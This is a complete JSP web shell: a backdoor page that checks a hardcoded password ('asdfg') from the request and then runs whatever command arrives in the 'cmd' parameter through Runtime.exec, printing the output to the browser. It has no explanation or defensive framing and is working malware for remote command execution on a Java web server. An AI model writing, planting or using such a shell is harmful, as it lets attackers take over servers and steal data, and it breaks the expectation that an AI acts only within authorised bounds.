<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*" %>
<%
    String pwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    String output = "";
    if((pwd.equals("asdfg")) && (cmd != null)) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) {
                output += s +"\r\n";
            }   
        } catch(IOException e) {
            e.printStackTrace();
        }   
    } else {
        out.println("");
    }
    out.println("<pre>"+output+"</pre>");
%>
